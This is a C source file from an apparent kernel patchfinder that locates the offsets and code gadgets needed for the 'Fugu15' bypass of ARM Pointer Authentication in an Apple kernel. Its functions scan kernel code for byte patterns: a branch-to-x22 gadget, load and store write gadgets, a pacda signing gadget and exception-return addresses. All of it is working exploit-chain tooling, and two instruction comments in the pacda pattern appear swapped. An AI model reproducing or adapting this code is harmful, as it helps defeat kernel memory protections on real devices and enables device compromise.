#include "xpf.h"

// Offsets required for the Fugu15 PAC bypass

uint64_t xpf_find_hw_lck_ticket_reserve_orig_allow_invalid_signed(void)
{
	uint32_t strX10X16Any = 0, strX10X16AnyMask = 0;
	arm64_gen_str_imm(0, ARM64_REG_X(10), ARM64_REG_X(16), OPT_UINT64_NONE, &strX10X16Any, &strX10X16AnyMask);

	uint32_t movzW0_0 = 0, movzW0_0Mask = 0;
	arm64_gen_mov_imm('z', ARM64_REG_W(0), OPT_UINT64(0), OPT_UINT64(0), &movzW0_0, &movzW0_0Mask);

	uint32_t inst[] = (uint32_t[]) {
		strX10X16Any, // str x10, [x16, ?]
		movzW0_0,     // movz w0, #0
		0xd65f03c0,   // ret
	};
	uint32_t mask[] = (uint32_t[]) {
		strX10X16AnyMask,
		movzW0_0Mask,
		0xffffffff,
	};

	PFPatternMetric *metric = pfmetric_pattern_init(inst, mask, sizeof(inst), BYTE_PATTERN_ALIGN_32_BIT);

	__block uint64_t hw_lck_ticket_reserve_orig_allow_invalid_signed = 0;
	pfmetric_run(gXPF.kernelTextSection, metric, ^(uint64_t vmaddr, bool *stop) {
		// Filter out anything with a wfe instruction before it
		if (pfsec_read32(gXPF.kernelTextSection, vmaddr-4) != 0xd503205f /* wfe */) {
			hw_lck_ticket_reserve_orig_allow_invalid_signed = vmaddr;
			*stop = true;
		}
	});
	return hw_lck_ticket_reserve_orig_allow_invalid_signed;
}

uint64_t xpf_find_hw_lck_ticket_reserve_orig_allow_invalid(void)
{
	uint32_t adrAny = 0, adrAnyMask = 0;
	arm64_gen_adr_p(OPT_BOOL(false), OPT_UINT64_NONE, OPT_UINT64_NONE, ARM64_REG_ANY, &adrAny, &adrAnyMask);

	uint64_t hw_lck_ticket_reserve_orig_allow_invalid_signed = xpf_resolve_item("hw_lck_ticket_reserve_orig_allow_invalid_signed");
	return pfsec_find_prev_inst(gXPF.kernelTextSection, hw_lck_ticket_reserve_orig_allow_invalid_signed, 40, adrAny, adrAnyMask);
}

uint64_t xpf_find_br_x22_gadget(void)
{
	// Gadget:
	// pacia x22, sp
	// (... some code ...)
	// braa x22, sp

	uint32_t inst[] = (uint32_t[]){
		0xd71f0adf // braa x22, sp
	};

	__block uint64_t brX22Gadget = 0;
	PFPatternMetric *pacMetric = pfmetric_pattern_init(inst, NULL, sizeof(inst), BYTE_PATTERN_ALIGN_32_BIT);
	pfmetric_run(gXPF.kernelTextSection, pacMetric, ^(uint64_t signCandidate, bool *stop) {
		uint32_t brX22 = 0xdac103f6; // pacia x22, sp
		uint64_t brX22Addr = pfsec_find_prev_inst(gXPF.kernelTextSection, signCandidate, 50, brX22, 0xffffffff);
		if (brX22Addr) {
			brX22Gadget = brX22Addr;
			*stop = true;
		}
	});

	return brX22Gadget;
}

uint64_t xpf_find_exception_return(void)
{
	uint32_t inst[] = (uint32_t[]){
		0xd5034fdf, // msr daifset, #0xf
		0xd538d083, // mrs x3, tpidr_el1
		0x910002bf  // mov sp, x21
	};

	PFPatternMetric *metric = pfmetric_pattern_init(inst, NULL, sizeof(inst), BYTE_PATTERN_ALIGN_32_BIT);
	__block uint64_t exception_return = 0;
	pfmetric_run(gXPF.kernelTextSection, metric, ^(uint64_t vmaddr, bool *stop){
		exception_return = vmaddr;
		*stop = true;
	});
	return exception_return;
}

uint64_t xpf_find_exception_return_after_check(void)
{
	uint64_t exception_return = xpf_resolve_item("exception_return");

	uint32_t inst[] = (uint32_t[]){
		0xaa0303fe, // mov x30, x3
		0xaa1603e3, // mov x3, x22
		0xaa1703e4, // mov x4, x23
		0xaa1803e5  // mov x5, x24
	};

	PFPatternMetric *metric = pfmetric_pattern_init(inst, NULL, sizeof(inst), BYTE_PATTERN_ALIGN_32_BIT);
	__block uint64_t exception_return_after_check = 0;
	pfmetric_run_from(gXPF.kernelTextSection, exception_return, metric, ^(uint64_t vmaddr, bool *stop){
		exception_return_after_check = vmaddr;
		*stop = true;
	});
	return exception_return_after_check;
}

uint64_t xpf_find_exception_return_after_check_no_restore(void)
{
	uint64_t exception_return = xpf_resolve_item("exception_return");

	uint32_t inst[] = (uint32_t[]){
		0xd5184021 // msr elr_el1, x1
	};

	PFPatternMetric *metric = pfmetric_pattern_init(inst, NULL, sizeof(inst), BYTE_PATTERN_ALIGN_32_BIT);
	__block uint64_t exception_return_after_check_no_restore = 0;
	pfmetric_run_from(gXPF.kernelTextSection, exception_return, metric, ^(uint64_t vmaddr, bool *stop){
		exception_return_after_check_no_restore = vmaddr;
		*stop = true;
	});
	return exception_return_after_check_no_restore;
}

uint64_t xpf_find_ldp_x0_x1_x8_gadget(void)
{
	uint32_t inst[] = (uint32_t[]){
		0xa9400500, // ldp x0, x1, [x8]
		0xd65f03c0  // ret
	};

	PFPatternMetric *metric = pfmetric_pattern_init(inst, NULL, sizeof(inst), BYTE_PATTERN_ALIGN_32_BIT);
	__block uint64_t ldp_x0_x1_x8_gadget = 0;
	pfmetric_run(gXPF.kernelTextSection, metric, ^(uint64_t vmaddr, bool *stop) {
		ldp_x0_x1_x8_gadget = vmaddr;
		*stop = true;
	});
	return ldp_x0_x1_x8_gadget;
}

uint64_t xpf_find_str_x8_x9_gadget(void)
{
	uint32_t inst[] = (uint32_t[]){
		0xf9000128, // str x8, [x9]
		0xd65f03c0  // ret
	};

	PFPatternMetric *metric = pfmetric_pattern_init(inst, NULL, sizeof(inst), BYTE_PATTERN_ALIGN_32_BIT);
	__block uint64_t str_x8_x9_gadget = 0;
	pfmetric_run(gXPF.kernelTextSection, metric, ^(uint64_t vmaddr, bool *stop) {
		str_x8_x9_gadget = vmaddr;
		*stop = true;
	});
	return str_x8_x9_gadget;
}

uint64_t xpf_find_str_x0_x19_ldr_x20_gadget(void)
{
	uint32_t ldrAnyX20Any = 0, ldrAnyX20AnyMask = 0;
	arm64_gen_ldr_imm(0, ARM64_REG_ANY, ARM64_REG_X(20), OPT_UINT64_NONE, &ldrAnyX20Any, &ldrAnyX20AnyMask);

	uint32_t inst[] = (uint32_t[]){
		0xf9000260,  // str x0, [x19]
		ldrAnyX20Any // ldr x?, [x20, ?]
	};
	uint32_t mask[] = (uint32_t[]){
		0xffffffff,
		ldrAnyX20AnyMask
	};

	PFPatternMetric *metric = pfmetric_pattern_init(inst, mask, sizeof(inst), BYTE_PATTERN_ALIGN_32_BIT);
	__block uint64_t str_x0_x19_ldr_x20_gadget = 0;
	pfmetric_run(gXPF.kernelTextSection, metric, ^(uint64_t vmaddr, bool *stop) {
		str_x0_x19_ldr_x20_gadget = vmaddr;
		*stop = true;
	});
	return str_x0_x19_ldr_x20_gadget;
}

uint64_t xpf_find_pacda_gadget(void)
{
	uint32_t inst[] = (uint32_t[]){
		0xf100003f, // cmp x1, #0
		0xdac10921, // pacda x1, x9
		0x9a8103e9, // str x9, [x8]
		0xf9000109, // csel x9, xzr, x1, eq
		0xd65f03c0  // ret
	};

	PFPatternMetric *metric = pfmetric_pattern_init(inst, NULL, sizeof(inst), BYTE_PATTERN_ALIGN_32_BIT);
	__block uint64_t pacda_gadget = 0;
	pfmetric_run(gXPF.kernelTextSection, metric, ^(uint64_t vmaddr, bool *stop) {
		pacda_gadget = vmaddr;
		*stop = true;
	});
	return pacda_gadget;
}

void xpf_pac_bypass_init(void)
{
	xpf_item_register("hw_lck_ticket_reserve_orig_allow_invalid_signed", xpf_find_hw_lck_ticket_reserve_orig_allow_invalid_signed, NULL);
	xpf_item_register("hw_lck_ticket_reserve_orig_allow_invalid", xpf_find_hw_lck_ticket_reserve_orig_allow_invalid, NULL);
	xpf_item_register("br_x22_gadget", xpf_find_br_x22_gadget, NULL);
	xpf_item_register("exception_return", xpf_find_exception_return, NULL);
	xpf_item_register("exception_return_after_check", xpf_find_exception_return_after_check, NULL);
	xpf_item_register("exception_return_after_check_no_restore", xpf_find_exception_return_after_check_no_restore, NULL);
	xpf_item_register("ldp_x0_x1_x8_gadget", xpf_find_ldp_x0_x1_x8_gadget, NULL);
	xpf_item_register("str_x8_x9_gadget", xpf_find_str_x8_x9_gadget, NULL);
	xpf_item_register("str_x0_x19_ldr_x20_gadget", xpf_find_str_x0_x19_ldr_x20_gadget, NULL);
	xpf_item_register("pacda_gadget", xpf_find_pacda_gadget, NULL);
}